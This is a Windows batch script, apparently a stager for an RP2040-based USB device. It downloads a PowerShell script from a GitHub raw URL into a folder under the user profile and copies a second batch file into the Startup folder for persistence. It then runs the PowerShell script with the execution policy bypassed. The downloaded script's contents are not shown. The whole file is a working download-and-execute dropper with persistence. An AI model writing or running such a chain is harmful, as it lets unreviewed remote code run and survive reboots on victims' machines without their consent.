@echo off
set "TARGET_DIR=C:\Users\%USERNAME%\TOOTHLESS"
set "SCRIPT_PATH=%TARGET_DIR%\code.ps1"
set "RUN_BAT_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat"

set "URL=https://raw.githubusercontent.com/ZDStudios/RP2040-USB/refs/heads/main/code.ps1"
set "RUN_BAT_URL=https://raw.githubusercontent.com/ZDStudios/RP2040-USB/refs/heads/main/run.bat"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo [INFO] Downloading code.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%SCRIPT_PATH%'"

if exist "%SCRIPT_PATH%" (
    echo [OK] code.ps1 downloaded.
) else (
    echo [ERROR] Failed to download code.ps1
    pause
    exit /b 1
)

echo [INFO] Downloading run.bat to Startup folder...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%RUN_BAT_URL%' -OutFile '%RUN_BAT_PATH%'"

if exist "%RUN_BAT_PATH%" (
    echo [OK] run.bat added to Startup.
) else (
    echo [ERROR] Failed to download run.bat to Startup folder.
    pause
    exit /b 1
)

echo [INFO] Running code.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_PATH%"
